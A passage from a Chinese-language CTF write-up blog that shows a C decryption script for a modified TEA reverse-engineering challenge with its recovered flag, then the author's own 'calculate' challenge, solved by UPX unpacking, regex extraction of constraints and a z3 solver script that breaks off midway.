class="number">1</span>,temp)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;done&#x27;</span>)</span><br></pre></td></tr></table></figure><p>关键函数在这里:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016160203949.png" alt="image-20231016160203949" style="zoom:50%;" /><p>注释就是已经分析出来的结果,我们写代码就行.</p><p>注意:</p><p>1.第一个加密只进行了1轮,并且v[0]和v[1]的加密顺序需要上下调换(被这个坑卡了好久,一度怀疑自己…)!</p><p>1.第一个加密的delta不是默认值!</p><p>2.第二个加密进行了33轮而不是32轮!</p><p>代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0x9e3779b9</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">33</span>; <span class="comment">// 注意是33轮</span></span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 注意是33轮</span></span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt2</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *k)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">0xda740da0</span>; <span class="comment">// delta不是默认值</span></span><br><span class="line">    <span class="type">uint32_t</span> sum = delta * <span class="number">1</span>; <span class="comment">// 只进行一次</span></span><br><span class="line">    <span class="type">uint32_t</span> k0 = k[<span class="number">0</span>], k1 = k[<span class="number">1</span>], k2 = k[<span class="number">2</span>], k3 = k[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// 原来的TEA代码中这两行上下需要进行互换</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1);</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> enc[] =</span><br><span class="line">            &#123;</span><br><span class="line">                    <span class="number">151</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">228</span>, <span class="number">108</span>, <span class="number">72</span>, <span class="number">77</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">91</span>,</span><br><span class="line">                    <span class="number">201</span>, <span class="number">234</span>, <span class="number">169</span>, <span class="number">5</span>, <span class="number">191</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">182</span>, <span class="number">36</span>, <span class="number">110</span>,</span><br><span class="line">                    <span class="number">124</span>, <span class="number">68</span>, <span class="number">95</span>, <span class="number">166</span>, <span class="number">62</span>, <span class="number">44</span>, <span class="number">76</span>, <span class="number">75</span>, <span class="number">236</span>, <span class="number">233</span>,</span><br><span class="line">                    <span class="number">63</span>, <span class="number">193</span>, <span class="number">0</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">            <span class="number">4660</span>, <span class="number">22136</span>, <span class="number">39612</span>, <span class="number">57072</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        decrypt((<span class="type">uint32_t</span> *) &amp;enc[<span class="number">8</span> * i], (<span class="type">uint32_t</span> *) key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        // 注释的这个交换是为了解决v[0]和v[1]的互换,但是发现v5和v6的值没有考虑?</span></span><br><span class="line"><span class="comment">        // 我的密码学不太好,总之直接解密函数中两行上下一交换就行...</span></span><br><span class="line"><span class="comment">        uint32_t * p = (uint32_t *) &amp;enc[8 * i];</span></span><br><span class="line"><span class="comment">        uint32_t temp = p[0];</span></span><br><span class="line"><span class="comment">        p[0] = p[1];</span></span><br><span class="line"><span class="comment">        p[1] = temp;*/</span></span><br><span class="line">        decrypt2((<span class="type">uint32_t</span> *) &amp;enc[<span class="number">8</span> * i], (<span class="type">uint32_t</span> *) key);</span><br><span class="line">        <span class="comment">/*temp = p[0];</span></span><br><span class="line"><span class="comment">        p[0] = p[1];</span></span><br><span class="line"><span class="comment">        p[1] = temp;*/</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得出flag:</p><p><code>XSCTF&#123;5MC_1s_v3ry_int3re5t1ng!!&#125;</code></p><h1 id="我出的题">我出的题</h1><h2 id="reverse">Reverse</h2><h3 id="题目1-calculate">题目1-calculate</h3><p>本题使用python3的z3库即可进行求解线性方程组,主要讲解正则表达式的利用.</p><p>打开会发现有一个有个UPX4的加壳,先在linux下进行脱壳.</p><p>随后丢进IDA分析,在check()函数中找到flag的检测,每一个if就是一个线性方程.</p><p>把所有的if语句的条件提取出来,就构成了一个线性方程组.</p><p>由于量比较大,我们先把函数复制出来,删掉其他东西,然后使用正则表达式进行提取:</p><img src="C:\Users\admin\AppData\Roaming\Typora\typora-user-images\image-20231016220733656.png" alt="image-20231016220733656" style="zoom:33%;" /><p>利用正则表达式进行一步步的处理:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016220842093.png" alt="image-20231016220842093" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016221050337.png" alt="image-20231016221050337" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016220919474.png" alt="image-20231016220919474" style="zoom: 50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016221423433.png" alt="image-20231016221423433" style="zoom:50%;" /><p>我们直接把<code>if(</code>替换成python的z3库中需要使用到的语句,也就是<code>solver.add(</code></p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016221454785.png" alt="image-20231016221454785" style="zoom:50%;" /><p>清一下空格:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016221532897.png" alt="image-20231016221532897" style="zoom:50%;" /><p>发现代码中有位运算,同样处理一下:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016222045012.png" alt="image-20231016222045012" style="zoom:50%;" /><p>记得把最后return语句的那个方程也处理一下</p><p>然后把数组转换为一个个的变量:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016222300876.png" alt="image-20231016222300876" style="zoom:50%;" /><p>最终结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016222319452.png" alt="image-20231016222319452" style="zoom:50%;" /><p>然后我们就可以使用python的z3库进行运算了,其余细节见脚本的注释:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1, 32):</span></span><br><span class="line"><span class="comment">#     print(&#x27;x&#x27; + str(i) + &#x27;,&#x27;, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># print(&#x27; = Ints(\&#x27;&#x27;, end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># for i in range(1, 32):</span></span><br><span class="line"><span class="comment">#     print(&#x27;x&#x27;+str(i),end=&#x27; &#x27;)</span></span><br><span class="line"><span class="comment"># print(&#x27;\&#x27;)&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>():</span><br><span class="line">    x0, x1, x2, x3, x4, x5, x6, x7, x8, x9, x10, x11, x12, x13, x14, x15, x16, x17, x18, x19, x20, x21, x22, x23= Ints(</span><br><span class="line">        <span class="string">&#x27;x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10 x11 x12 x13 x14 x15 x16 x17 x18 x19 x20 x21 x22 x23&#x27;</span>)</span><br><span class="line">    solver = Solver()</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">212</span> * x22 + <span class="number">819</span> * x21 + <span class="number">421</span> * x20 + <span class="number">814</span> * x19 + <span class="number">781</span> * x18 + <span class="number">184</span> * x17 + <span class="number">709</span> * x16 + <span class="number">401</span> * x15 + <span class="number">351</span> * x14 + <span class="number">993</span> * x13 + <span class="number">814</span> * x12 + <span class="number">553</span> * x11 + <span class="number">495</span> * x10 + <span class="number">646</span> * x9 + <span class="number">565</span> * x8 + <span class="number">271</span> * x7 + <span class="number">520</span> * x6 + <span class="number">770</span> * x5 + <span class="number">335</span> * x4 + <span class="number">680</span> * x3 + <span class="number">625</span> * x2 + <span class="number">215</span> * x1 + <span class="number">250</span> * x0 + <span class="number">525</span> * x23 == <span class="number">1173434</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">909</span> * x22 + <span class="number">819</span> * x21 + <span class="number">404</span> * x20 + <span class="number">323</span> * x19 + <span class="number">961</span> * x18 + <span class="number">625</span> * x17 + <span class="number">630</span> * x16 + <span class="number">760</span> * x15 + <span class="number">781</span> * x14 + <span class="number">353</span> * x13 + <span class="number">207</span> * x12 + <span class="number">363</span> * x11 + <span class="number">126</span> * x10 + <span class="number">569</span> * x9 + <span class="number">279</span> * x8 + <span class="number">988</span> * x7 + <span class="number">115</span> * x6 + <span class="number">815</span> * x5 + <span class="number">598</span> * x4 + <span class="number">186</span> * x3 + <span class="number">795</span> * x2 + <span class="number">744</span> * x1 + <span class="number">371</span> * x0 + <span class="number">354</span> * x23 == <span class="number">1290416</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">216</span> * x22 + <span class="number">482</span> * x21 + <span class="number">239</span> * x20 + <span class="number">185</span> * x19 + <span class="number">726</span> * x18 + <span class="number">809</span> * x17 + <span class="number">414</span> * x16 + <span class="number">655</span> * x15 + <span class="number">771</span> * x14 + <span class="number">974</span> * x13 + <span class="number">888</span> * x12 + <span class="number">784</span> * x11 + <span class="number">716</span> * x10 + <span class="number">998</span> * x9 + <span class="number">251</span> * x8 + <span class="number">889</span> * x7 + <span class="number">503</span> * x6 + <span class="number">594</span> * x5 + <span class="number">895</span> * x4 + <span class="number">663</span> * x3 + <span class="number">145</span> * x2 + <span class="number">371</span> * x1 + <span class="number">276</span> * x0 + <span class="number">609</span> * x23 == <span class="number">1339295</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">361</span> * x22 + <span class="number">721</span> * x21 + <span class="number">877</span> * x20 + <span class="number">449</span> * x19 + <span class="number">868</span> * x18 + <span class="number">356</span> * x17 + <span class="number">138</span> * x16 + <span class="number">345</span> * x15 + <span class="number">568</span> * x14 + <span class="number">310</span> * x13 + <span class="number">601</span> * x12 + <span class="number">121</span> * x11 + <span class="number">590</span> * x10 + <span class="number">132</span> * x9 + <span class="number">308</span> * x8 + <span class="number">928</span> * x7 + <span class="number">655</span> * x6 + <span class="number">806</span> * x5 + <span class="number">538</span> * x4 + <span class="number">736</span> * x3 + <span class="number">409</span> * x2 + <span class="number">697</span> * x1 + <span class="number">936</span> * x0 + <span class="number">465</span> * x23 == <span class="number">1167720</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">946</span> * x22 + <span class="number">620</span> * x21 + <span class="number">707</span> * x20 + <span class="number">934</span> * x19 + <span class="number">729</span> * x18 + <span class="number">939</span> * x17 + <span class="number">837</span> * x16 + <span class="number">672</span> * x15 + <span class="number">930</span> * x14 + <span class="number">972</span> * x13 + <span class="number">970</span> * x12 + <span class="number">990</span> * x11 + <span class="number">357</span> * x10 + <span class="number">721</span> * x9 + <span class="number">757</span> * x8 + <span class="number">845</span> * x7 + <span class="number">355</span> * x6 + <span class="number">155</span> * x5 + <span class="number">186</span> * x4 + <span class="number">201</span> * x3 + <span class="number">391</span> * x2 + <span class="number">208</span> * x1 + <span class="number">269</span> * x0 + <span class="number">979</span> * x23 == <span class="number">1457642</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">992</span> * x22 + <span class="number">243</span> * x21 + <span class="number">970</span> * x20 + <span class="number">752</span> * x19 + <span class="number">518</span> * x18 + <span class="number">657</span> * x17 + <span class="number">995</span> * x16 + <span class="number">176</span> * x15 + <span class="number">837</span> * x14 + <span class="number">330</span> * x13 + <span class="number">840</span> * x12 + <span class="number">806</span> * x11 + <span class="number">964</span> * x10 + <span class="number">400</span> * x9 + <span class="number">207</span> * x8 + <span class="number">561</span> * x7 + <span class="number">620</span> * x6 + <span class="number">147</span> * x5 + <span class="number">938</span> * x4 + <span class="number">333</span> * x3 + <span class="number">957</span> * x2 + <span class="number">603</span> * x1 + <span class="number">652</span> * x0 + <span class="number">366</span> * x23 == <span class="number">1424563</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">650</span> * x22 + <span class="number">998</span> * x21 + <span class="number">297</span> * x20 + <span class="number">634</span> * x19 + <span class="number">427</span> * x18 + <span class="number">380</span> * x17 + <span class="number">174</span> * x16 + <span class="number">313</span> * x13 + <span class="number">955</span> * x10 + <span class="number">712</span> * x9 + <span class="number">764</span> * x8 + <span class="number">369</span> * x7 + <span class="number">923</span> * x6 + <span class="number">547</span> * x5 + <span class="number">898</span> * x4 + <span class="number">587</span> * x3 + <span class="number">315</span> * x2 + <span class="number">842</span> * x1 + <span class="number">425</span> * x0 + <span class="number">920</span> * x11 + <span class="number">768</span> * x12 + <span class="number">784</span> * x14 + <span class="number">144</span> * x15 + <span class="number">756</span> * x23 == <span class="number">1289169</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">456</span> * x22 + <span class="number">943</span> * x21 + <span class="number">629</span> * x20 + <span class="number">463</span> * x19 + <span class="number">154</span> * x18 + <span class="number">366</span> * x17 + <span class="number">265</span> * x16 + <span class="number">253</span> * x15 + <span class="number">168</span> * x14 + <span class="number">766</span> * x13 + <span class="number">689</span> * x12 + <span class="number">986</span> * x11 + <span class="number">523</span> * x10 + <span class="number">756</span> * x9 + <span class="number">978</span> * x8 + <span class="number">941</span> * x7 + <span class="number">684</span> * x6 + <span class="number">922</span> * x5 + <span class="number">263</span> * x4 + <span class="number">162</span> * x3 + <span class="number">510</span> * x2 + <span class="number">600</span> * x1 + <span class="number">655</span> * x0 + <span class="number">488</span> * x23 == <span class="number">1255084</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">895</span> * x22 + <span class="number">560</span> * x21 + <span class="number">701</span> * x20 + <span class="number">123</span> * x19 + <span class="number">937</span> * x18 + <span class="number">922</span> * x17 + <span class="number">515</span> * x16 + <span class="number">178</span> * x15 + <span class="number">467</span> * x14 + <span class="number">370</span> * x13 + <span class="number">475</span> * x12 + <span class="number">346</span> * x11 + <span class="number">261</span> * x10 + <span class="number">946</span> * x9 + <span class="number">921</span> * x8 + <span class="number">324</span> * x7 + <span class="number">149</span> * x6 + <span class="number">809</span> * x5 + <span class="number">163</span> * x4 + <span class="number">732</span> * x3 + <span class="number">228</span> * x2 + <span class="number">651</span> * x1 + <span class="number">788</span> * x0 + <span class="number">248</span> * x23 == <span class="number">1244160</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">174</span> * x22 + <span class="number">850</span> * x21 + <span class="number">999</span> * x20 + <span class="number">430</span> * x19 + <span class="number">587</span> * x18 + <span class="number">272</span> * x17 + <span class="number">361</span> * x16 + <span class="number">644</span> * x15 + <span class="number">887</span> * x14 + <span class="number">180</span> * x13 + <span class="number">787</span> * x12 + <span class="number">646</span> * x11 + <span class="number">275</span> * x10 + <span class="number">383</span> * x9 + <span class="number">426</span> * x8 + <span class="number">208</span> * x7 + <span class="number">267</span> * x6 + <span class="number">697</span> * x5 + <span class="number">226</span> * x4 + <span class="number">339</span> * x3 + <span class="number">209</span> * x2 + <span class="number">388</span> * x1 + <span class="number">739</span> * x0 + <span class="number">821</span> * x23 == <span class="number">1043988</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">106</span> * x22 + <span class="number">247</span> * x21 + <span class="number">249</span> * x20 + <span class="number">962</span> * x19 + <span class="number">138</span> * x18 + <span class="number">984</span> * x17 + <span class="number">763</span> * x16 + <span class="number">934</span> * x15 + <span class="number">350</span> * x14 + <span class="number">559</span> * x13 + <span class="number">913</span> * x12 + <span class="number">499</span> * x11 + <span class="number">369</span> * x10 + <span class="number">855</span> * x9 + <span class="number">733</span> * x8 + <span class="number">205</span> * x7 + <span class="number">446</span> * x4 + <span class="number">997</span> * x3 + <span class="number">890</span> * x2 + <span class="number">101</span> * x1 + <span class="number">855</span> * x0 + <span class="number">518</span> * x5 + <span class="number">192</span> * x6 + <span class="number">751</span> * x23 == <span class="number">1286775</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">388</span> * x22 + <span class="number">169</span> * x21 + <span class="number">579</span> * x20 + <span class="number">507</span> * x19 + <span class="number">676</span> * x18 + <span class="number">673</span> * x17 + <span class="number">106</span> * x16 + <span class="number">629</span> * x15 + <span class="number">657</span> * x14 + <span class="number">998</span> * x13 + <span class="number">624</span> * x12 + <span class="number">677</span> * x11 + <span class="number">109</span> * x10 + <span class="number">352</span> * x9 + <span class="number">344</span> * x8 + <span class="number">333</span> * x7 + <span class="number">989</span> * x6 + <span class="number">383</span> * x5 + <span class="number">927</span> * x4 + <span class="number">378</span> * x3 + <span class="number">868</span> * x2 + <span class="number">568</span> * x1 + <span class="number">363</span> * x0 + <span class="number">408</span> * x23 == <span class="number">1212216</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(<span class="number">919</span> * x22 + <span class="number">396</span> * x21 + (x20 * <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">7</span>))</span><br><span class="line">               + <span class="number">167</span> * x19 + <span class="number">391</span> * x18 + <span class="number">326</span> * x17 + <span class="number">992</span> * x16 + <span class="number">369</span> * x15 + <span class="number">874</span> * x14 + <span class="number">322</span> * x13 + <span class="number">793</span> * x12 + <span class="number">851</span> * x11 + <span class="number">312</span> * x10 + <span class="number">571</span> * x9 + <span class="number">789</span> * x8 + <span class="number">641</span> * x7 + <span class="number">380</span> * x6 + <span class="number">892</span> * x5 + <span class="number">368</span> * x4 + <span class="number">410</span> * x3 + <span class="number">855</span> * x2 + <span class="number">223</span> * x1 + <span class="number">958</span> * x0 + <span class="number">248</span> * x23 == <span class="number">1325165</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">857</span> * x22 + <span class="number">651</span> * x21 + <span class="number">264</span> * x20 + <span class="number">380</span> * x19 + <span class="number">967</span> * x18 + <span class="number">264</span> * x17 + <span class="number">186</span> * x16 + <span class="number">249</span> * x15 + <span class="number">939</span> * x14 + <span class="number">548</span> * x13 + <span class="number">101</span> * x12 + <span class="number">400</span> * x11 + <span class="number">660</span> * x10 + <span class="number">317</span> * x9 + <span class="number">876</span> * x8 + <span class="number">838</span> * x7 + <span class="number">231</span> * x6 + <span class="number">923</span> * x5 + <span class="number">676</span> * x4 + <span class="number">896</span> * x3 + <span class="number">518</span> * x2 + <span class="number">696</span> * x1 + <span class="number">401</span> * x0 + <span class="number">684</span> * x23 == <span class="number">1264958</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(</span><br><span class="line">        <span class="number">766</span> * x22 + <span class="number">434</span> * x21 + <span class="number">662</span> * x20 + <span class="number">986</span> * x19 + <span class="number">613</span> * x18 + <span class="number">145</span> * x17 + <span class="number">236</span> * x16 + <span 